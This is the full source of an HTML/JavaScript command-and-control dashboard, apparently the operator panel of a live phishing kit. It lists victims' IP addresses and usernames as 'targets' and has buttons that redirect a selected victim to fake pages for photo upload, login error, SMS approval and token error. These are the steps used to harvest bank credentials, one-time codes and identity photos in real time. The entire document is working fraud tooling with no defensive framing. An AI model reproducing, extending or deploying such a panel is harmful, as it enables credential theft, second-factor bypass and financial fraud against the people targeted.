<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>// CYBORG NINJA C2 //</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root {
    --pixel-red: #ff0040;
    --pixel-blue: #0080ff;
    --pixel-green: #00ff40;
    --pixel-yellow: #ffcc00;
    --pixel-gray: #1a1a2a;
    --pixel-dark: #0a0a14;
    --pixel-border: #404060;
    --terminal-green: #80ff80;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    image-rendering: pixelated;
    font-family: 'Courier New', 'Pixel', monospace;
}

body {
    background-color: var(--pixel-dark);
    color: var(--terminal-green);
    height: 100vh;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

/* CRT Effect */
.crt-effect {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    pointer-events: none; z-index: 1000;
    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
                linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
    background-size: 100% 4px, 3px 100%;
}

/* Main Layout */
.dashboard-container {
    display: flex;
    flex: 1;
    height: 100%;
}

/* Sidebar (Left) */
.sidebar {
    width: 350px;
    background: #111;
    border-right: 2px solid var(--pixel-blue);
    display: flex;
    flex-direction: column;
}

.sidebar-header {
    background: var(--pixel-blue);
    color: #000;
    padding: 10px;
    font-weight: bold;
    text-align: center;
}

.user-list {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
}

.user-item {
    background: #222;
    border: 1px solid #444;
    margin-bottom: 8px;
    padding: 10px;
    cursor: pointer;
    transition: all 0.2s;
    position: relative;
}

.user-item:hover {
    border-color: var(--pixel-yellow);
    background: #2a2a2a;
}

.user-item.active {
    border-color: var(--pixel-green);
    background: rgba(0, 255, 64, 0.1);
    box-shadow: 0 0 10px rgba(0, 255, 64, 0.2);
}

.user-item .ip { color: var(--pixel-blue); font-weight: bold; }
.user-item .info { font-size: 12px; color: #aaa; margin-top: 4px; }
.user-item .status-indicator {
    position: absolute; top: 10px; right: 10px;
    width: 8px; height: 8px; border-radius: 50%;
    background: #555;
}
.user-item.online .status-indicator { background: var(--pixel-green); box-shadow: 0 0 5px var(--pixel-green); }

/* Main Panel (Right) */
.main-panel {
    flex: 1;
    padding: 20px;
    background-image: 
        repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 80, 160, 0.1) 2px, rgba(0, 80, 160, 0.1) 4px);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}

/* Control Grid (Existing buttons) */
.controls-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 20px;
    width: 100%;
    max-width: 600px;
}

.pixel-btn {
    padding: 20px;
    background: rgba(20, 20, 30, 0.8);
    border: 2px solid var(--pixel-border);
    color: white;
    cursor: pointer;
    text-align: center;
    transition: 0.2s;
}

.pixel-btn:hover {
    transform: translate(-2px, -2px);
    box-shadow: 4px 4px 0 rgba(0,0,0,0.5);
}

/* Header */
.header-info {
    text-align: center;
    margin-bottom: 30px;
}

.target-display {
    font-size: 18px;
    color: var(--pixel-yellow);
    margin-top: 10px;
    padding: 10px;
    border: 1px dashed var(--pixel-yellow);
    background: rgba(255, 204, 0, 0.1);
    min-width: 300px;
}

</style>
</head>
<body>
    <div class="crt-effect"></div>

    <div class="dashboard-container">
        <!-- Sidebar: Active Sessions -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <i class="fas fa-users"></i> ACTIVE TARGETS
            </div>
            <div id="userList" class="user-list">
                <!-- User items will be injected here -->
                <div style="padding:20px; text-align:center; color:#666;">Scanning...</div>
            </div>
        </aside>

        <!-- Main Control Deck -->
        <main class="main-panel">
            <div class="header-info">
                <h1 style="color: var(--pixel-red); letter-spacing: 4px;">// COMMAND & CONTROL //</h1>
                <div id="targetDisplay" class="target-display">NO TARGET SELECTED</div>
            </div>

            <!-- Existing Buttons reused but simplified layout -->
            <div class="controls-grid">
                <button class="pixel-btn" onclick="sendCommand('fotos.html')" style="border-color: var(--pixel-green);">
                    <i class="fas fa-camera fa-2x" style="color: var(--pixel-green); margin-bottom: 10px;"></i><br>
                    SOLICITAR FOTOS
                </button>

                <button class="pixel-btn" onclick="sendCommand('indexincorrecto.html')" style="border-color: var(--pixel-red);">
                    <i class="fas fa-times-circle fa-2x" style="color: var(--pixel-red); margin-bottom: 10px;"></i><br>
                    LOGIN ERROR
                </button>

                <button class="pixel-btn" onclick="sendCommand('sms.html')" style="border-color: var(--pixel-blue);">
                    <i class="fas fa-check-circle fa-2x" style="color: var(--pixel-blue); margin-bottom: 10px;"></i><br>
                    APROBAR (SMS)
                </button>

                <button class="pixel-btn" onclick="sendCommand('tokenincorrecto.html')" style="border-color: var(--pixel-yellow);">
                    <i class="fas fa-exclamation-triangle fa-2x" style="color: var(--pixel-yellow); margin-bottom: 10px;"></i><br>
                    TOKEN ERROR
                </button>

                <button class="pixel-btn" onclick="sendCommand('success.html')" style="grid-column: span 2; border-color: #fff;">
                    <i class="fas fa-flag-checkered fa-2x" style="color: #fff; margin-bottom: 10px;"></i><br>
                    FINALIZAR PROCESO
                </button>
            </div>
            
            <div id="statusLog" style="margin-top:20px; font-size:12px; color:#666;">Ready.</div>
        </main>
    </div>

    <script>
        let currentTargetId = null;

        // Auto-refresh user list
        function fetchSessions() {
            fetch('list_sessions.php')
                .then(r => r.json())
                .then(data => {
                    const list = document.getElementById('userList');
                    list.innerHTML = '';
                    
                    if(data.sessions.length === 0) {
                        list.innerHTML = '<div style="padding:20px; text-align:center;">No active sessions</div>';
                        return;
                    }

                    data.sessions.forEach(s => {
                        const div = document.createElement('div');
                        div.className = `user-item ${s.is_online ? 'online' : ''} ${s.id === currentTargetId ? 'active' : ''}`;
                        div.onclick = () => selectTarget(s);
                        div.innerHTML = `
                            <div class="status-indicator"></div>
                            <div class="ip">${s.ip}</div>
                            <div class="info">User: ${s.usuario}</div>
                            <div class="info">Last seen: ${s.last_seen_fmt}</div>
                        `;
                        list.appendChild(div);
                    });
                });
        }

        function selectTarget(session) {
            currentTargetId = session.id;
            document.getElementById('targetDisplay').innerHTML = `
                Target Locked: <span style="color:#fff">${session.ip}</span><br>
                User: ${session.usuario}<br>
                ID: ${session.id}
            `;
            fetchSessions(); // Refund to update active class
        }

        function sendCommand(url) {
            if (!currentTargetId) {
                alert("⚠ SELECT A TARGET FIRST!");
                return;
            }

            document.getElementById('statusLog').innerText = `Sending command to ${currentTargetId}...`;

            fetch('api.php?action=command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `sid=${encodeURIComponent(currentTargetId)}&cmd=redirect&url=${encodeURIComponent(url)}`
            })
            .then(r => r.json())
            .then(d => {
                const log = document.getElementById('statusLog');
                if(d.status === 'ok') {
                    log.innerText = `Command Executed via C2: ${url}`;
                    log.style.color = 'var(--pixel-green)';
                } else {
                    log.innerText = `Error: ${d.message}`;
                    log.style.color = 'var(--pixel-red)';
                }
            });
        }

        setInterval(fetchSessions, 2000);
        fetchSessions();
    </script>
</body>
</html>